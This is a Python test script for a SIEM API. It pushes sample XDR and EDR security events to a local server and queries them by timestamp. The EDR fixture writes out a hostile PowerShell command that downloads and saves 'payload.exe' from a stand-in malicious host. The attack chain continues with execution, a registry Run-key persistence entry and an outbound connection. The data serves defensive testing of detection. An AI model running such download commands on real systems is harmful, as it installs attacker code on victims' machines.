import requests
import json

SIEM_APIServer_IP = "http://192.168.1.205"
SIEM_APIServer_PORT = 10900


"""'''
    PUSH
'''

# Security-Threat Sample Document Data
req_path = "/api/solution/siem/event/push/security-threat"
Data = \
{
  "platform": "xdr",
  "timestamp_nano_iso8601": "2024-10-28T08:53:50.112233445Z",
  "timestamp_nano": 1730105630112233445,
  "event_id": "xdr-evt-abcdef12-3456-7890-1234-567890abcdef",
  "severity": "medium",
  "topic": "Anomalous Data Exfiltration Detected",
  "description": "AI model detected an unusual volume of data being uploaded from a database server (10.0.5.20) to an external cloud storage provider outside of normal business hours. This activity deviates significantly from the established baseline.",
  "response_description": "Review the uploaded data to determine if it contains sensitive information. Verify with the server administrator if this activity was authorized.",
  "detected_method": "ai"
}
response = requests.post(f"{SIEM_APIServer_IP}:{SIEM_APIServer_PORT}{req_path}", data=json.dumps(Data).encode() )
print( dict( response.json() ) )
'''
    > Output
        {'status': True, 'output': {'message': 'Event successfully indexed.'}}
'''


# raw-edr Sample Document Data
req_path = "/api/solution/siem/event/push/raw-edr"
Data = {
  "IAM": {
    "username": "userA",
    "ipv4": "192.168.1.55",
    "agent_id": "agent-ws-fin03"
  },
  "agent_id": "agent-ws-fin03",
  "os_platform": "Windows",
  "os_version": "10.0.19045",
  "event_count": 5,
  "events": [
    {
      "timestamp_nano_iso8601": "2025-11-09T10:58:10.947712900Z",
      "timestamp_nano": 1762685890947712900,
      "self_session_id": "edr-proc-111",
      "parent_session_id": "edr-proc-010",
      "root_session_id": "edr-proc-010",
      "pid": 5432,
      "processcreation": {
        "exe_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "exe_size": 450560,
        "exe_sha256": "a1b2c3d4...",
        "commandline": "powershell.exe -Command \"IWR -Uri http://malicious.site/payload.exe -OutFile C:\\Users\\Public\\suspicious.exe\"",
        "ppid": 1234,
        "parent_exe_path": "C:\\Windows\\explorer.exe",
        "user": {
          "username": "compromised_user",
          "windows_sid": "S-1-5-21-..."
        }
      },
      "rule": {
        "id": "EDR-001",
        "name": "PowerShell File Download",
        "description": "PowerShell was used to download a file from the internet.",
        "severity": "medium",
        "mitre_attack": {
          "tactic": "Command and Control",
          "technique_id": "T1105",
          "data_sources": ["Process", "Network Traffic"]
        }
      }
    },
    {
      "timestamp_nano_iso8601": "2025-11-09T10:58:25.200000000Z",
      "timestamp_nano": 1762685892520000000,
      "self_session_id": "edr-proc-111",
      "parent_session_id": "edr-proc-010",
      "root_session_id": "edr-proc-010",
      "pid": 5432,
      "filesystem": {
        "action": "create",
        "filepath": "C:\\Users\\Public\\suspicious.exe",
        "filesize": 123456,
        "filesha256": "e4d5f6g7..."
      }
    },
    {
      "timestamp_nano_iso8601": "2025-11-09T10:58:26.300000000Z",
      "timestamp_nano": 1762685892630000000,
      "self_session_id": "edr-proc-222",
      "parent_session_id": "edr-proc-111",
      "root_session_id": "edr-proc-010",
      "pid": 6789,
      "processcreation": {
        "exe_path": "C:\\Users\\Public\\suspicious.exe",
        "exe_size": 123456,
        "exe_sha256": "e4d5f6g7...",
        "commandline": "C:\\Users\\Public\\suspicious.exe",
        "ppid": 5432,
        "parent_exe_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
      },
      "rule": {
        "id": "EDR-005",
        "name": "Execution of Unsigned Executable",
        "description": "An unsigned executable was run from a public user directory.",
        "severity": "high",
        "mitre_attack": {
          "tactic": "Execution",
          "technique_id": "T1204",
          "subtechnique_id": "T1204.002"
        }
      }
    },
    {
      "timestamp_nano_iso8601": "2025-11-09T10:58:30.400000000Z",
      "timestamp_nano": 1762685893040000000,
      "self_session_id": "edr-proc-222",
      "parent_session_id": "edr-proc-111",
      "root_session_id": "edr-proc-010",
      "pid": 6789,
      "windows_registry": {
        "keyclass": "SetValue",
        "name": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware"
      }
    },
    {
      "timestamp_nano_iso8601": "2025-11-09T10:58:35.500000000Z",
      "timestamp_nano": 1762685893550000000,
      "self_session_id": "edr-proc-222",
      "parent_session_id": "edr-proc-111",
      "root_session_id": "edr-proc-010",
      "pid": 6789,
      "network": {
        "protocol": "TCP",
        "src_ip": "192.168.1.55",
        "src_port": 61234,
        "dst_ip": "98.76.54.32",
        "dst_port": 80,
        "direction": "outbound"
      }
    }
  ]
}

response = requests.post(f"{SIEM_APIServer_IP}:{SIEM_APIServer_PORT}{req_path}", data=json.dumps(Data).encode() )
print( dict( response.json() ) )
'''
    > Output
        {'status': True, 'output': {'message': 'Event successfully indexed.'}}
'''"""



# Query

# query _ to _ raw-edr
req_path = "/api/solution/siem/event/query/timestamp-range/raw-edr"
parms = {
    "start_nano_timestamp" : 1762685892520000000
}
response = requests.get(f"{SIEM_APIServer_IP}:{SIEM_APIServer_PORT}{req_path}", params=parms )
print( dict( response.json() ) )

# query _ to _ security-threat
req_path = "/api/solution/siem/event/query/timestamp-range/security-threat"
parms = {
    "start_nano_timestamp" : 1730105630110233500
}
response = requests.get(f"{SIEM_APIServer_IP}:{SIEM_APIServer_PORT}{req_path}", params=parms )
print( dict( response.json() ) )